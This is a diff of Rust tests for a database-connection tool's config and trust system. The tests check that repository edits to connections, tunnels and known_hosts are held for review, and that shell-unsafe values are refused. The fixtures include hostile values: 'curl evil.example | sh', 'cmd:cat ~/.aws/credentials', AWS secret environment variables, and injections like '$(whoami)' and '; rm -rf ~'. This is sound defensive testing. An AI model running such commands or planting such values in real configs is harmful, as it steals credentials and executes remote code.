@@ -44,9 +44,12 @@ impl Fixture {
         path
     }
 
+    /// Trusts the repository as it is now (ADR-022 pins its content).
     fn trusted(&self) -> TrustStore {
         let mut trust = TrustStore::load(&self.user()).unwrap();
-        trust.trust(&self.repo()).unwrap();
+        trust
+            .trust(&load(Some(&self.repo()), &self.user()))
+            .unwrap();
         trust
     }
 }
@@ -340,9 +343,9 @@ fn resolves_variables_paths_tls_and_tunnels() {
 }
 
 #[test]
-fn missing_variables_point_at_the_file() {
+fn missing_variables_say_what_to_add() {
     let fx = Fixture::new("missing-var");
-    let file = fx.write("repo/.spelunk/connections/prod/orders.toml", ORDERS);
+    fx.write("repo/.spelunk/connections/prod/orders.toml", ORDERS);
     fx.write("repo/.spelunk/tunnels/bastion.toml", BASTION);
     let config = load(Some(&fx.repo()), &fx.user());
     let trust = fx.trusted();
@@ -351,11 +354,11 @@ fn missing_variables_point_at_the_file() {
         ..Default::default()
     };
     match Resolver::new(&config, &trust, &backend).resolve(&ws("prod/orders")) {
-        Err(ResolveError::Config(e)) => {
-            assert_eq!(e.file, file);
+        Err(e @ ResolveError::MissingVariables { .. }) => {
+            let message = e.to_string();
             assert!(
-                e.message.contains("db_user") && e.message.contains("[vars]"),
-                "{e}"
+                message.contains("${user.db_user}") && message.contains("[vars]"),
+                "{message}"
             );
         }
         other => panic!("expected a variable error: {other:?}"),
@@ -373,13 +376,14 @@ fn with_password(fx: &Fixture, secret: &str) -> spelunk_config::Config {
 #[test]
 fn secrets_resolve_from_each_source() {
     let fx = Fixture::new("secrets");
-    let trust = fx.trusted();
     let backend = FakeBackend {
         env: BTreeMap::from([("PGPASS".into(), "from-env".into())]),
         ..Default::default()
     };
+    // Each secret is a new version of the file: trusted as written.
     let password = |secret: &str| {
         let config = with_password(&fx, secret);
+        let trust = fx.trusted();
         Resolver::new(&config, &trust, &backend)
             .resolve(&ws("db"))
             .map(|r| r.password)
@@ -418,9 +422,9 @@ fn secrets_resolve_from_each_source() {
 #[test]
 fn keychain_asks_the_first_time_and_remembers() {
     let fx = Fixture::new("keychain");
-    let trust = fx.trusted();
     let backend = FakeBackend::default();
     let config = with_password(&fx, "keychain");
+    let trust = fx.trusted();
     let resolver = Resolver::new(&config, &trust, &backend);
 
     let first = resolver.resolve(&ws("db")).unwrap();
@@ -499,6 +503,7 @@ fn creates_new_connection_files() {
         password: None,
         tunnel: None,
         kubernetes: None,
+        sqlite3: None,
         read_only: true,
         tls: Default::default(),
         mcp: Default::default(),
@@ -595,10 +600,14 @@ fn postgres_draft() -> ConnectionDraft {
         password: PasswordChoice::Keychain,
         tls_mode: TlsModeConfig::VerifyFull,
         tls_ca: String::new(),
+        tls_cert: String::new(),
+        tls_key: String::new(),
         tunnel: String::new(),
         kubernetes: None,
+        sqlite3: String::new(),
         read_only: false,
         mcp_exposed: true,
+        mcp_writes: false,
     }
 }
 
@@ -673,9 +682,11 @@ fn sqlite_drafts_keep_repository_paths_portable_and_drop_network_fields() {
         database: fx.repo().join("data").join("shop.db").display().to_string(),
         host: "ignored".into(),
         user: "ignored".into(),
-        tunnel: "ignored".into(),
+        // A tunnel would mean a file on a server (ADR-018): none here.
+        tunnel: String::new(),
         password: PasswordChoice::Prompt,
         mcp_exposed: false,
+        mcp_writes: false,
         ..postgres_draft()
     };
     let file = draft.to_file(&config).unwrap();
@@ -903,6 +914,61 @@ fn editing_keeps_comments_and_settings_the_form_does_not_show() {
 }
 
 #[test]
+fn the_form_lets_agents_write_or_only_read() {
+    let fx = Fixture::new("draft-mcp-writes");
+    let path = fx.write("repo/.spelunk/connections/orders.toml", HAND_WRITTEN);
+    let id = ws("orders");
+    let backend = FakeBackend::default();
+    let config = load(Some(&fx.repo()), &fx.user());
+    let draft = ConnectionDraft::from_entry(config.connection(&id).unwrap());
+    assert!(!draft.mcp_writes);
+
+    let allow = ConnectionDraft {
+        mcp_writes: true,
+        ..draft.clone()
+    };
+    spelunk_config::update_connection(&config, &id, &allow, None, &backend).unwrap();
+    let content = std::fs::read_to_string(&path).unwrap();
+    assert!(content.contains("writes = \"allow\""), "{content}");
+    assert!(
+        content.contains("max_rows = 50 # agents get few rows"),
+        "{content}"
+    );
+    let config = load(Some(&fx.repo()), &fx.user());
+    let entry = config.connection(&id).unwrap();
+    assert_eq!(entry.file.mcp.writes, WritePolicy::Allow);
+    assert!(ConnectionDraft::from_entry(entry).mcp_writes);
+
+    // Back to reading only: the default, so the key goes away.
+    spelunk_config::update_connection(&config, &id, &draft, None, &backend).unwrap();
+    let content = std::fs::read_to_string(&path).unwrap();
+    assert!(!content.contains("writes"), "{content}");
+
+    // A hand-written `confirm` the form cannot show is kept by unrelated edits.
+    fx.write(
+        "repo/.spelunk/connections/orders.toml",
+        &HAND_WRITTEN.replace("writes = \"deny\"", "writes = \"confirm\""),
+    );
+    let config = load(Some(&fx.repo()), &fx.user());
+    let renamed = ConnectionDraft {
+        name: "Orders (EU)".into(),
+        ..ConnectionDraft::from_entry(config.connection(&id).unwrap())
+    };
+    spelunk_config::update_connection(&config, &id, &renamed, None, &backend).unwrap();
+    let content = std::fs::read_to_string(&path).unwrap();
+    assert!(content.contains("writes = \"confirm\""), "{content}");
+
+    // New connections that allow writes say so in their file.
+    let file = ConnectionDraft {
+        mcp_writes: true,
+        ..postgres_draft()
+    }
+    .to_file(&config)
+    .unwrap();
+    assert_eq!(file.mcp.writes, WritePolicy::Allow);
+}
+
+#[test]
 fn editing_the_password_updates_or_forgets_the_keychain_entry() {
     let fx = Fixture::new("draft-edit-password");
     let path = fx.write("repo/.spelunk/connections/orders.toml", HAND_WRITTEN);
@@ -1107,7 +1173,10 @@ fn kubernetes_connection(resource: &str) -> ConnectionDraft {
         password: PasswordChoice::Prompt,
         tls_mode: TlsModeConfig::Disable,
         tls_ca: String::new(),
+        tls_cert: String::new(),
+        tls_key: String::new(),
         tunnel: String::new(),
+        sqlite3: String::new(),
         kubernetes: Some(KubernetesDraft {
             context: "kind-orders".into(),
             namespace: "shop".into(),
@@ -1117,6 +1186,7 @@ fn kubernetes_connection(resource: &str) -> ConnectionDraft {
         }),
         read_only: false,
         mcp_exposed: false,
+        mcp_writes: false,
     }
 }
 
@@ -1550,4 +1620,608 @@ fn personal_and_repository_entries_are_separate() {
         resolved.hops[1].password,
         Password::Value(Secret::new("personal"))
     );
+}
+
+/// SQLite with a tunnel is a file on the server (ADR-018): its path is the server's, kept as
+/// written. DuckDB may not have a tunnel, and `sqlite3` only goes with one.
+#[test]
+fn sqlite_files_on_a_server_go_through_a_tunnel() {
+    let fx = Fixture::new("conn-sqlite-remote");
+    std::fs::create_dir_all(fx.repo().join(".spelunk/connections")).unwrap();
+    std::fs::create_dir_all(fx.repo().join(".spelunk/tunnels")).unwrap();
+    std::fs::write(
+        fx.repo().join(".spelunk/tunnels/jump.toml"),
+        "schema_version = 1\n[[hops]]\nhost = \"files.internal\"\nuser = \"deploy\"\nauth = [\"agent\"]\n",
+    )
+    .unwrap();
+    std::fs::write(
+        fx.repo().join(".spelunk/connections/remote.toml"),
+        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"data/app.db\"\ntunnel = \"jump\"\nsqlite3 = \"/opt/sqlite/bin/sqlite3\"\n",
+    )
+    .unwrap();
+    std::fs::write(
+        fx.repo().join(".spelunk/connections/duck.toml"),
+        "schema_version = 1\nengine = \"duckdb\"\ndatabase = \"x.duckdb\"\ntunnel = \"jump\"\n",
+    )
+    .unwrap();
+    std::fs::write(
+        fx.repo().join(".spelunk/connections/local.toml"),
+        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"x.db\"\nsqlite3 = \"sqlite3\"\n",
+    )
+    .unwrap();
+    let config = load(Some(&fx.repo()), &fx.user());
+    let problems = format!("{:?}", config.problems);
+    assert!(problems.contains("DuckDB is a local file"), "{problems}");
+    assert!(problems.contains("sqlite3 only applies"), "{problems}");
+    assert!(!problems.contains("remote.toml"), "{problems}");
+
+    let backend = FakeBackend::default();
+    let id = ConnectionId {
+        source: Source::Workspace,
+        path: "remote".into(),
+    };
+    let resolved = Resolver::new(&config, &fx.trusted(), &backend)
+        .resolve(&id)
+        .unwrap();
+    // Not resolved against the repository: it is a path on the server.
+    assert_eq!(resolved.params.database, "data/app.db");
+    assert_eq!(resolved.sqlite3.as_deref(), Some("/opt/sqlite/bin/sqlite3"));
+    assert_eq!(resolved.tunnel.unwrap().hops[0].host, "files.internal");
+}
+
+const PINNED_DB: &str = "schema_version = 1\nname = \"Orders\"\nengine = \"postgres\"\nhost = \"db.internal\"\ndatabase = \"orders\"\nuser = \"app\"\npassword = { secret = \"keychain\" }\ntunnel = \"bastion\"\n";
+const PINNED_TUNNEL: &str = "schema_version = 1\n\n[[hops]]\nhost = \"bastion.internal\"\nuser = \"ops\"\nauth = [\"agent\"]\n";
+
+fn resolved(fx: &Fixture, trust: &TrustStore) -> Result<(), ResolveError> {
+    let config = load(Some(&fx.repo()), &fx.user());
+    assert!(config.problems.is_empty(), "{:?}", config.problems);
+    Resolver::new(&config, trust, &FakeBackend::default())
+        .resolve(&ws("orders"))
+        .map(|_| ())
+}
+
+fn changed(result: Result<(), ResolveError>) -> spelunk_config::ItemChange {
+    match result {
+        Err(ResolveError::Changed { change, .. }) => change,
+        other => panic!("expected a change to review: {other:?}"),
+    }
+}
+
+#[test]
+fn a_pull_that_changes_a_trusted_connection_is_asked_about_again() {
+    let fx = Fixture::new("pinned-change");
+    let path = fx.write("repo/.spelunk/connections/orders.toml", PINNED_DB);
+    fx.write("repo/.spelunk/tunnels/bastion.toml", PINNED_TUNNEL);
+    let mut trust = fx.trusted();
+    resolved(&fx, &trust).unwrap();
+
+    // Comments, formatting and the display name are not changes.
+    std::fs::write(
+        &path,
+        format!(
+            "# reviewed by the team\n{}",
+            PINNED_DB.replace("name = \"Orders\"", "name   =   \"Orders (EU)\"")
+        ),
+    )
+    .unwrap();
+    resolved(&fx, &trust).unwrap();
+
+    // The server changes: nothing is resolved, and the change says what and how.
+    std::fs::write(&path, PINNED_DB.replace("db.internal", "attacker.example")).unwrap();
+    let change = changed(resolved(&fx, &trust));
+    assert_eq!(change.item, "connection:orders");
+    assert!(!change.new);
+    assert_eq!(
+        change.fields,
+        [spelunk_config::FieldChange {
+            field: "host".into(),
+            before: Some("db.internal".into()),
+            after: Some("attacker.example".into()),
+        }]
+    );
+    let message = ResolveError::Changed {
+        root: fx.repo(),
+        change: change.clone(),
+    }
+    .to_string();
+    assert!(
+        message.contains("host db.internal → attacker.example"),
+        "{message}"
+    );
+    // Reloading the trust from disk does not forget the snapshot.
+    let reloaded = TrustStore::load(&fx.user()).unwrap();
+    changed(resolved(&fx, &reloaded));
+
+    // Accepting records only that item.
+    let config = load(Some(&fx.repo()), &fx.user());
+    trust.accept(&config, &change.item).unwrap();
+    resolved(&fx, &trust).unwrap();
+    resolved(&fx, &TrustStore::load(&fx.user()).unwrap()).unwrap();
+}
+
+#[test]
+fn every_way_around_the_snapshot_is_caught() {
+    let fx = Fixture::new("pinned-ways");
+    let path = fx.write("repo/.spelunk/connections/orders.toml", PINNED_DB);
+    let tunnel = fx.write("repo/.spelunk/tunnels/bastion.toml", PINNED_TUNNEL);
+    let trust = fx.trusted();
+    for (field, edited) in [
+        (
+            "password.secret",
+            PINNED_DB.replace("\"keychain\"", "\"env:AWS_SECRET_ACCESS_KEY\""),
+        ),
+        ("port", format!("{PINNED_DB}port = 15432\n")),
+        ("tunnel", PINNED_DB.replace("tunnel = \"bastion\"\n", "")),
+        (
+            "tls.mode",
+            format!("{PINNED_DB}\n[tls]\nmode = \"disable\"\n"),
+        ),
+        (
+            "user",
+            PINNED_DB.replace("user = \"app\"", "user = \"${env:AWS_SECRET_ACCESS_KEY}\""),
+        ),
+        (
+            "mcp.writes",
+            format!("{PINNED_DB}\n[mcp]\nexposed = true\nwrites = \"allow\"\n"),
+        ),
+    ] {
+        std::fs::write(&path, &edited).unwrap();
+        let change = changed(resolved(&fx, &trust));
+        assert!(
+            change.fields.iter().any(|f| f.field == field),
+            "{field}: {change:?}"
+        );
+    }
+    std::fs::write(&path, PINNED_DB).unwrap();
+    resolved(&fx, &trust).unwrap();
+
+    // The tunnel the connection goes through is checked too.
+    std::fs::write(
+        &tunnel,
+        PINNED_TUNNEL.replace("bastion.internal", "evil.example"),
+    )
+    .unwrap();
+    let change = changed(resolved(&fx, &trust));
+    assert_eq!(change.item, "tunnel:bastion");
+    assert_eq!(change.fields[0].field, "hops.0.host");
+    std::fs::write(
+        &tunnel,
+        format!("{PINNED_TUNNEL}command = \"curl evil.example | sh\"\n"),
+    )
+    .unwrap();
+    assert_eq!(changed(resolved(&fx, &trust)).item, "tunnel:bastion");
+    std::fs::write(&tunnel, PINNED_TUNNEL).unwrap();
+    resolved(&fx, &trust).unwrap();
+
+    // A connection added after trusting is new: nothing of it is resolved either.
+    fx.write(
+        "repo/.spelunk/connections/new.toml",
+        "schema_version = 1\nengine = \"postgres\"\nhost = \"x\"\ndatabase = \"d\"\nuser = \"u\"\npassword = { secret = \"cmd:cat ~/.aws/credentials\" }\n",
+    );
+    let config = load(Some(&fx.repo()), &fx.user());
+    match Resolver::new(&config, &trust, &FakeBackend::default()).resolve(&ws("new")) {
+        Err(ResolveError::Changed { change, .. }) => {
+            assert!(change.new);
+            assert!(change.to_string().contains("is new in the repository"));
+        }
+        other => panic!("{other:?}"),
+    }
+    assert_eq!(trust.changes(&config).len(), 1);
+}
+
+#[test]
+fn drafts_are_the_users_but_the_tunnels_they_use_are_checked() {
+    let fx = Fixture::new("pinned-draft");
+    fx.write("repo/.spelunk/connections/orders.toml", PINNED_DB);
+    let tunnel = fx.write("repo/.spelunk/tunnels/bastion.toml", PINNED_TUNNEL);
+    let trust = fx.trusted();
+    let backend = FakeBackend::default();
+    let config = load(Some(&fx.repo()), &fx.user());
+    let draft = ConnectionDraft {
+        host: "typed-by-the-user".into(),
+        ..ConnectionDraft::from_entry(config.connection(&ws("orders")).unwrap())
+    };
+    let resolver = Resolver::new(&config, &trust, &backend);
+    resolver.resolve_edit(&ws("orders"), &draft).unwrap();
+    resolver
+        .resolve_draft(&ConnectionDraft {
+            name: "Copy".into(),
+            ..draft.clone()
+        })
+        .unwrap();
+
+    std::fs::write(
+        &tunnel,
+        PINNED_TUNNEL.replace("bastion.internal", "evil.example"),
+    )
+    .unwrap();
+    let config = load(Some(&fx.repo()), &fx.user());
+    let resolver = Resolver::new(&config, &trust, &backend);
+    assert!(matches!(
+        resolver.resolve_edit(&ws("orders"), &draft),
+        Err(ResolveError::Changed { .. })
+    ));
+}
+
+#[test]
+fn repositories_trusted_before_snapshots_are_adopted_as_they_are() {
+    let fx = Fixture::new("pinned-legacy");
+    let path = fx.write("repo/.spelunk/connections/orders.toml", PINNED_DB);
+    fx.write("repo/.spelunk/tunnels/bastion.toml", PINNED_TUNNEL);
+    // A trust file written before ADR-022: trusted by path only.
+    let root = std::fs::canonicalize(fx.repo()).unwrap();
+    std::fs::write(
+        fx.user().join("trusted-workspaces.toml"),
+        toml::to_string(&toml::Table::from_iter([(
+            "trusted".to_string(),
+            toml::Value::Array(vec![root.display().to_string().into()]),
+        )]))
+        .unwrap(),
+    )
+    .unwrap();
+    let mut trust = TrustStore::load(&fx.user()).unwrap();
+    assert!(trust.is_trusted(&fx.repo()));
+    resolved(&fx, &trust).unwrap();
+
+    let config = load(Some(&fx.repo()), &fx.user());
+    assert!(trust.adopt(&config).unwrap());
+    assert!(!trust.adopt(&config).unwrap());
+    std::fs::write(&path, PINNED_DB.replace("db.internal", "attacker.example")).unwrap();
+    changed(resolved(&fx, &TrustStore::load(&fx.user()).unwrap()));
+
+    // Trusting again accepts the change, and says which.
+    let config = load(Some(&fx.repo()), &fx.user());
+    let accepted = trust.trust(&config).unwrap();
+    assert_eq!(accepted.len(), 1);
+    assert_eq!(accepted[0].item, "connection:orders");
+    resolved(&fx, &trust).unwrap();
+
+    // Revoking forgets the snapshots: trusting later starts again from what is there.
+    trust.revoke(&fx.repo()).unwrap();
+    assert!(matches!(
+        resolved(&fx, &trust),
+        Err(ResolveError::Untrusted { .. })
+    ));
+}
+
+const TEAM_HOSTS: &str = "# Reviewed by the team\nbastion.internal ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0Cx5aAdFPmIIPx6ZxdIYFKbARZbBbB5NV0QIO3Qdp2\n";
+
+#[test]
+fn the_teams_known_hosts_is_used_only_as_trusted() {
+    let fx = Fixture::new("team-hosts");
+    fx.write("repo/.spelunk/connections/orders.toml", PINNED_DB);
+    fx.write("repo/.spelunk/tunnels/bastion.toml", PINNED_TUNNEL);
+    let hosts = fx.write("repo/.spelunk/known_hosts", TEAM_HOSTS);
+    let backend = FakeBackend::default();
+
+    // Untrusted repository: nothing of it is used (its connections do not even resolve).
+    let config = load(Some(&fx.repo()), &fx.user());
+    let untrusted = TrustStore::load(&fx.user()).unwrap();
+    assert!(matches!(
+        Resolver::new(&config, &untrusted, &backend).resolve(&ws("orders")),
+        Err(ResolveError::Untrusted { .. })
+    ));
+
+    // Trusted: the tunnel carries the team's file.
+    let trust = fx.trusted();
+    let known = |trust: &TrustStore| {
+        let config = load(Some(&fx.repo()), &fx.user());
+        Resolver::new(&config, trust, &backend)
+            .resolve(&ws("orders"))
+            .map(|r| r.tunnel.unwrap().known_hosts)
+    };
+    assert_eq!(known(&trust).unwrap(), Some(hosts.clone()));
+
+    // Comments and blank lines are not changes.
+    std::fs::write(&hosts, format!("{TEAM_HOSTS}\n# another comment\n")).unwrap();
+    assert_eq!(known(&trust).unwrap(), Some(hosts.clone()));
+
+    // Another key for the bastion: the connection waits for a review, and says what changed.
+    std::fs::write(&hosts, TEAM_HOSTS.replace("Qdp2", "XXXX")).unwrap();
+    let change = changed(known(&trust).map(|_| ()));
+    assert_eq!(change.item, spelunk_config::KNOWN_HOSTS_ITEM);
+    assert_eq!(change.fields[0].field, "bastion.internal ssh-ed25519");
+    assert!(
+        change
+            .to_string()
+            .contains("the file .spelunk/known_hosts changed"),
+        "{change}"
+    );
+    // Testing a tunnel from its editor leaves the unreviewed file out instead.
+    let config = load(Some(&fx.repo()), &fx.user());
+    let draft = spelunk_config::TunnelDraft::from_entry(
+        config
+            .tunnel_for(Source::Workspace, "bastion")
+            .expect("the tunnel"),
+    );
+    let tested = Resolver::new(&config, &trust, &backend)
+        .resolve_tunnel_draft(&draft)
+        .unwrap();
+    assert_eq!(tested.known_hosts, None);
+
+    // Accepting it records it; then it is used again.
+    let mut trust = trust;
+    trust
+        .accept(&config, spelunk_config::KNOWN_HOSTS_ITEM)
+        .unwrap();
+    assert_eq!(known(&trust).unwrap(), Some(hosts.clone()));
+
+    // Added after trusting: new, so reviewed before it is used.
+    std::fs::remove_file(&hosts).unwrap();
+    let config = load(Some(&fx.repo()), &fx.user());
+    trust
+        .accept(&config, spelunk_config::KNOWN_HOSTS_ITEM)
+        .unwrap();
+    assert_eq!(known(&trust).unwrap(), None);
+    std::fs::write(&hosts, TEAM_HOSTS).unwrap();
+    assert!(changed(known(&trust).map(|_| ())).new);
+}
+
+#[test]
+fn client_certificates_come_in_pairs_and_keys_stay_out_of_the_repository() {
+    let fx = Fixture::new("client-cert");
+    let base = "schema_version = 1\nengine = \"postgres\"\nhost = \"db\"\ndatabase = \"d\"\nuser = \"ops\"\n";
+    fx.write(
+        "repo/.spelunk/connections/alone.toml",
+        &format!("{base}\n[tls]\ncert = \"certs/ops.crt\"\n"),
+    );
+    fx.write(
+        "repo/.spelunk/connections/mssql.toml",
+        "schema_version = 1\nengine = \"sqlserver\"\nhost = \"db\"\nuser = \"ops\"\n\n[tls]\ncert = \"a.crt\"\nkey = \"~/a.key\"\n",
+    );
+    fx.write(
+        "repo/.spelunk/connections/leaked.toml",
+        &format!("{base}\n[tls]\ncert = \"certs/ops.crt\"\nkey = \"certs/ops.key\"\n"),
+    );
+    fx.write("repo/.spelunk/connections/good.toml", &format!("{base}\n[tls]\nmode = \"verify-full\"\ncert = \"certs/ops.crt\"\nkey = \"~/.spelunk-test/ops.key\"\n"));
+    let config = load(Some(&fx.repo()), &fx.user());
+    let problems: Vec<String> = config.problems.iter().map(|p| p.to_string()).collect();
+    assert!(
+        problems
+            .iter()
+            .any(|p| p.contains("alone.toml") && p.contains("go together")),
+        "{problems:?}"
+    );
+    assert!(
+        problems
+            .iter()
+            .any(|p| p.contains("mssql.toml") && p.contains("SQL Server does not")),
+        "{problems:?}"
+    );
+
+    let trust = fx.trusted();
+    let backend = FakeBackend::default();
+    let resolver = Resolver::new(&config, &trust, &backend);
+    match resolver.resolve(&ws("leaked")) {
+        Err(ResolveError::Config(e)) => {
+            assert!(e.to_string().contains("inside the repository"), "{e}")
+        }
+        other => panic!(
+            "a key in the repository must be refused: {:?}",
+            other.map(|_| ())
+        ),
+    }
+    let good = resolver.resolve(&ws("good")).unwrap();
+    assert_eq!(
+        good.params.client_certificate,
+        Some(fx.repo().join("certs/ops.crt"))
+    );
+    let key = good.params.client_key.unwrap();
+    assert!(
+        key.ends_with(".spelunk-test/ops.key") && !key.starts_with(fx.repo()),
+        "{key:?}"
+    );
+
+    // The form keeps a repository key absolute (so it is refused, not shared) and writes a
+    // key in the home directory as `~/…`.
+    let draft = |key: String| ConnectionDraft {
+        tls_cert: fx.repo().join("certs/ops.crt").display().to_string(),
+        tls_key: key,
+        ..postgres_draft()
+    };
+    let file = draft(fx.repo().join("certs/ops.key").display().to_string())
+        .to_file(&config)
+        .unwrap();
+    assert_eq!(file.tls.cert.as_deref(), Some("certs/ops.crt"));
+    assert!(Path::new(file.tls.key.as_deref().unwrap()).is_absolute());
+    let home = std::env::var_os(if cfg!(windows) { "USERPROFILE" } else { "HOME" }).unwrap();
+    let in_home = Path::new(&home)
+        .join(".ssl")
+        .join("ops.key")
+        .display()
+        .to_string();
+    let file = draft(in_home).to_file(&config).unwrap();
+    assert_eq!(file.tls.key.as_deref(), Some("~/.ssl/ops.key"));
+}
+
+#[test]
+fn cloud_tokens_write_a_safe_command_and_come_back_to_the_form() {
+    use spelunk_config::CloudToken;
+    let fx = Fixture::new("cloud-token");
+    let config = load(Some(&fx.repo()), &fx.user());
+    let draft = |token: CloudToken, host: &str, user: &str| ConnectionDraft {
+        host: host.into(),
+        user: user.into(),
+        port: None,
+        password: PasswordChoice::CloudToken(token),
+        ..postgres_draft()
+    };
+    let secret = |d: ConnectionDraft| d.to_file(&config).map(|f| f.password.unwrap().secret);
+
+    assert_eq!(
+        secret(draft(
+            CloudToken::AwsRds,
+            "orders.c9akciq32.eu-west-1.rds.amazonaws.com",
+            "ops_iam"
+        ))
+        .unwrap(),
+        "cmd:aws rds generate-db-auth-token --hostname orders.c9akciq32.eu-west-1.rds.amazonaws.com --port 5432 --username ops_iam --region eu-west-1"
+    );
+    // Not an RDS name: the CLI's default region.
+    assert_eq!(
+        secret(draft(CloudToken::AwsRds, "db.internal", "ops")).unwrap(),
+        "cmd:aws rds generate-db-auth-token --hostname db.internal --port 5432 --username ops"
+    );
+    assert!(
+        secret(draft(
+            CloudToken::AzureAd,
+            "x.postgres.database.azure.com",
+            "ops@contoso.com"
+        ))
+        .unwrap()
+        .starts_with("cmd:az account get-access-token")
+    );
+    assert_eq!(
+        secret(draft(
+            CloudToken::GoogleCloudSql,
+            "10.0.0.3",
+            "ops@example.iam"
+        ))
+        .unwrap(),
+        "cmd:gcloud sql generate-login-token"
+    );
+
+    // Nothing that a shell would read as more than a name gets into the command.
+    for (host, user) in [
+        ("db; rm -rf ~", "ops"),
+        ("db", "ops && curl evil.example | sh"),
+        ("db", "$(whoami)"),
+        ("db`id`", "ops"),
+        ("", "ops"),
+    ] {
+        let err = secret(draft(CloudToken::AwsRds, host, user)).unwrap_err();
+        assert!(
+            err.to_string().contains("can only contain"),
+            "{host} {user}: {err}"
+        );
+    }
+    let sqlserver = ConnectionDraft {
+        engine: Engine::Sqlserver,
+        ..draft(CloudToken::AzureAd, "db", "ops")
+    };
+    assert!(
+        secret(sqlserver)
+            .unwrap_err()
+            .to_string()
+            .contains("not sqlserver")
+    );
+
+    // Saved and opened again, the form shows the token, not a raw command; a hand-written
+    // command stays a command.
+    let token = draft(
+        CloudToken::AwsRds,
+        "orders.c9akciq32.eu-west-1.rds.amazonaws.com",
+        "ops_iam",
+    );
+    let id = add_connection(&config, &token, None, &FakeBackend::default()).unwrap();
+    let config = load(Some(&fx.repo()), &fx.user());
+    assert_eq!(
+        ConnectionDraft::from_entry(config.connection(&id).unwrap()).password,
+        PasswordChoice::CloudToken(CloudToken::AwsRds)
+    );
+    let handmade = ConnectionDraft {
+        name: "Handmade".into(),
+        password: PasswordChoice::Other(
+            "cmd:aws rds generate-db-auth-token --hostname other".into(),
+        ),
+        ..token.clone()
+    };
+    let id = add_connection(&config, &handmade, None, &FakeBackend::default()).unwrap();
+    let config = load(Some(&fx.repo()), &fx.user());
+    assert!(matches!(
+        ConnectionDraft::from_entry(config.connection(&id).unwrap()).password,
+        PasswordChoice::Other(_)
+    ));
+}
+
+#[test]
+fn every_missing_personal_variable_is_reported_at_once_and_saved_in_place() {
+    let fx = Fixture::new("user-vars");
+    fx.write(
+        "repo/.spelunk/connections/orders.toml",
+        "schema_version = 1\nengine = \"postgres\"\nhost = \"db.internal\"\ndatabase = \"orders\"\nuser = \"${user.db_user}\"\npassword = { secret = \"keychain\" }\ntunnel = \"bastion\"\n\n[tls]\nmode = \"verify-full\"\ncert = \"certs/${user.db_user}.crt\"\nkey = \"~/.ssl/${user.db_user}.key\"\n",
+    );
+    fx.write(
+        "repo/.spelunk/tunnels/bastion.toml",
+        "schema_version = 1\n\n[[hops]]\nhost = \"bastion.internal\"\nuser = \"${user.ssh_user}\"\nauth = [\"agent\"]\n",
+    );
+    let user_toml = fx.write(
+        "user/user.toml",
+        "# My personal settings\nschema_version = 1\n\n[vars]\nteam = \"dba\" # kept\n",
+    );
+    let trust = fx.trusted();
+    let backend = FakeBackend::default();
+    let resolve = || {
+        let config = load(Some(&fx.repo()), &fx.user());
+        Resolver::new(&config, &trust, &backend)
+            .resolve(&ws("orders"))
+            .map(|_| ())
+    };
+
+    // Both variables, the tunnel's too, once each, before anything is resolved.
+    match resolve() {
+        Err(ResolveError::MissingVariables { names }) => {
+            assert_eq!(names, ["db_user", "ssh_user"]);
+            let message = ResolveError::MissingVariables { names }.to_string();
+            assert!(
+                message.contains("${user.db_user}, ${user.ssh_user}")
+                    && message.contains("user.toml"),
+                "{message}"
+            );
+        }
+        other => panic!("{:?}", other.map(|_| ())),
+    }
+    assert!(
+        backend.keychain.lock().unwrap().is_empty(),
+        "nothing was read"
+    );
+
+    spelunk_config::set_user_vars(
+        &fx.user(),
+        &BTreeMap::from([("db_user".to_string(), " ana ".to_string())]),
+    )
+    .unwrap();
+    match resolve() {
+        Err(ResolveError::MissingVariables { names }) => assert_eq!(names, ["ssh_user"]),
+        other => panic!("{:?}", other.map(|_| ())),
+    }
+    spelunk_config::set_user_vars(
+        &fx.user(),
+        &BTreeMap::from([("ssh_user".to_string(), "ana.ops".to_string())]),
+    )
+    .unwrap();
+    resolve().unwrap();
+    let config = load(Some(&fx.repo()), &fx.user());
+    let resolved = Resolver::new(&config, &trust, &backend)
+        .resolve(&ws("orders"))
+        .unwrap();
+    assert_eq!(resolved.params.user, "ana");
+    assert_eq!(resolved.tunnel.unwrap().hops[0].user, "ana.ops");
+
+    // The file keeps its comments and other values.
+    let content = std::fs::read_to_string(&user_toml).unwrap();
+    assert!(content.starts_with("# My personal settings\n"), "{content}");
+    assert!(content.contains("team = \"dba\" # kept"), "{content}");
+    assert!(content.contains("db_user = \"ana\""), "{content}");
+
+    // Bad names and empty values are refused; a new user directory gets a new file.
+    for (name, value) in [("db user", "x"), ("x}", "y"), ("ok", "  ")] {
+        assert!(
+            spelunk_config::set_user_vars(
+                &fx.user(),
+                &BTreeMap::from([(name.to_string(), value.to_string())])
+            )
+            .is_err(),
+            "{name:?} = {value:?}"
+        );
+    }
+    let fresh = fx.base.join("fresh-user");
+    spelunk_config::set_user_vars(
+        &fresh,
+        &BTreeMap::from([("db_user".to_string(), "luis".to_string())]),
+    )
+    .unwrap();
+    let config = load(None, &fresh);
+    assert!(config.problems.is_empty(), "{:?}", config.problems);
+    assert_eq!(config.user.vars["db_user"], "luis");
 }
